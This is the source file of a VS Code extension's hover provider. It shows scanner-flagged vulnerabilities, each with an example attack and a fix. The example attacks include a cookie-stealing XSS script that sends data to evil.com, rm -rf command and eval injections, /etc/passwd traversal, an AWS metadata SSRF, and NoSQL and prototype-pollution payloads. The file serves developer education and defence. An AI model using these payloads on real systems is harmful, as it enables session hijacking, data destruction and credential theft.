import * as vscode from 'vscode';
import { SecurityScanner } from '../scanner/securityScanner';

const VULNERABILITY_DETAILS: Record<string, {
    title: string;
    scenario: string;
    impact: string;
    reference: string;
}> = {
    'sql-injection': {
        title: 'SQL Injection (CWE-89 / OWASP A03)',
        scenario: "An attacker enters `' OR '1'='1` as input. Your query becomes:\n`SELECT * FROM users WHERE id = '' OR '1'='1'`\nThis returns **all rows** in the table — bypassing authentication entirely.",
        impact: 'Data exfiltration, authentication bypass, database destruction.',
        reference: 'Fix: Use parameterized queries / prepared statements.',
    },
    'xss': {
        title: 'Cross-Site Scripting — XSS (CWE-79 / OWASP A03)',
        scenario: "An attacker tricks a user into visiting a link that injects:\n`<script>document.location='https://evil.com/steal?c='+document.cookie</script>`\nThis script runs in the victim's browser and **steals their session cookies**.",
        impact: 'Session hijacking, credential theft, malware distribution.',
        reference: 'Fix: Use textContent instead of innerHTML, or sanitize with DOMPurify.',
    },
    'api-key': {
        title: 'Exposed API Key / Secret Token (CWE-798)',
        scenario: "Anyone who reads your source code (GitHub, npm package, build output) can copy this key and use it immediately.\nFor example, an exposed AWS key can result in **thousands of dollars in cloud charges** within hours.",
        impact: 'Unauthorized API usage, financial loss, data breach.',
        reference: 'Fix: Move to environment variables and add the file to .gitignore.',
    },
    'hardcoded-secret': {
        title: 'Hardcoded Credential (CWE-259 / CWE-798)',
        scenario: "Hardcoded passwords are visible to anyone with access to your code or binary.\nAttackers regularly scan GitHub for patterns like `password =` and use automated tools to exploit them within **minutes of a commit**.",
        impact: 'Unauthorized access to databases, services, or infrastructure.',
        reference: 'Fix: Use environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault).',
    },
    'unsafe-eval': {
        title: 'Code Injection via eval() (CWE-95)',
        scenario: "If `userInput` contains `require('child_process').exec('rm -rf /')`\nand you pass it to `eval()`, the server executes it with **full process permissions**.",
        impact: 'Remote code execution, server compromise, data destruction.',
        reference: 'Fix: Use JSON.parse() for data, or a sandboxed VM module if dynamic execution is required.',
    },
    'path-traversal': {
        title: 'Path Traversal (CWE-22 / OWASP A01)',
        scenario: "An attacker sends the filename `../../../../etc/passwd`.\nYour code resolves it to `/etc/passwd` and **reads the system password file**.",
        impact: 'Unauthorized file access, configuration leaks, credential exposure.',
        reference: 'Fix: Use path.resolve() and validate that the result starts with the expected base directory.',
    },
    'ssrf': {
        title: 'Server-Side Request Forgery — SSRF (CWE-918 / OWASP A10)',
        scenario: "An attacker passes `http://169.254.169.254/latest/meta-data/` as the URL.\nYour server fetches it and returns **AWS instance metadata including IAM credentials**.",
        impact: 'Internal network access, cloud metadata theft, credential exfiltration.',
        reference: 'Fix: Validate URLs against an allowlist of trusted domains before making requests.',
    },
    'nosql-injection': {
        title: 'NoSQL Injection (CWE-943)',
        scenario: "An attacker sends `{ \"$gt\": \"\" }` as the password field.\nMongoDB interprets this as *greater than empty string* and **authenticates without a real password**.",
        impact: 'Authentication bypass, unauthorized data access.',
        reference: 'Fix: Sanitize inputs, avoid $where operators, use mongoose schema validation.',
    },
    'prototype-pollution': {
        title: 'Prototype Pollution (CWE-1321)',
        scenario: "An attacker sends `{\"__proto__\": {\"isAdmin\": true}}` in a JSON body.\nAfter an unsafe `merge()` call, **every object in the app gains `isAdmin: true`**.",
        impact: 'Privilege escalation, denial of service, remote code execution.',
        reference: 'Fix: Use Object.create(null), validate keys against a whitelist, or use safe-merge libraries.',
    },
    'command-injection': {
        title: 'Command Injection (CWE-78 / OWASP A03)',
        scenario: "An attacker passes `; rm -rf /var/www/html` as a parameter.\nYour shell command becomes `ls /uploads; rm -rf /var/www/html` — **your web root is deleted**.",
        impact: 'Arbitrary command execution, server takeover, data destruction.',
        reference: 'Fix: Never pass user input to shell commands. Use execFile() with separate argument arrays.',
    },
    'redos': {
        title: 'ReDoS — Regular Expression Denial of Service (CWE-1333)',
        scenario: "A pattern like `(a+)+` against input `aaaaaaaaaaaaaaaaaX` causes **exponential backtracking**.\nA single HTTP request can freeze your Node.js event loop for minutes.",
        impact: 'Denial of service, server unavailability.',
        reference: 'Fix: Remove nested quantifiers, test regexes with tools like safe-regex or vuln-regex-detector.',
    },
    'buffer-overflow': {
        title: 'Buffer Overflow (CWE-120)',
        scenario: "`strcpy(dest, userInput)` copies without checking the size.\nIf `userInput` is longer than `dest`, it **overwrites adjacent memory** — attackers craft inputs to overwrite the return address and hijack execution.",
        impact: 'Arbitrary code execution, process crash, privilege escalation.',
        reference: 'Fix: Use strncpy() with explicit size limits, or std::string in C++.',
    },
    'unsafe-deserialization': {
        title: 'Unsafe Deserialization (CWE-502 / OWASP A08)',
        scenario: "An attacker crafts a malicious serialized object. When `ObjectInputStream.readObject()` deserializes it, **the embedded gadget chain executes arbitrary code** on the server.",
        impact: 'Remote code execution, server takeover.',
        reference: 'Fix: Avoid Java native serialization. Use JSON/XML with schema validation instead.',
    },
};

export class HoverProvider implements vscode.HoverProvider {
    constructor(private scanner: SecurityScanner) {}

    provideHover(
        document: vscode.TextDocument,
        position: vscode.Position,
    ): vscode.ProviderResult<vscode.Hover> {
        const vulnerabilities = this.scanner.scanDocument(document);

        const match = vulnerabilities.find(v => {
            const vulnLine = v.line - 1;
            if (vulnLine !== position.line) {
                return false;
            }
            return position.character >= v.column &&
                   position.character <= v.column + v.code.length;
        });

        if (!match) {
            return null;
        }

        const details = VULNERABILITY_DETAILS[match.type];
        if (!details) {
            return null;
        }

        const md = new vscode.MarkdownString('', true);
        md.isTrusted = false;
        md.supportHtml = false;

        md.appendMarkdown(`### 🛡 ${details.title}\n\n`);
        md.appendMarkdown(`**Attack scenario:**\n\n${details.scenario}\n\n`);
        md.appendMarkdown(`**Impact:** ${details.impact}\n\n`);
        md.appendMarkdown(`**${details.reference}**`);

        const range = new vscode.Range(
            match.line - 1, match.column,
            match.line - 1, match.column + match.code.length,
        );

        return new vscode.Hover(md, range);
    }
}
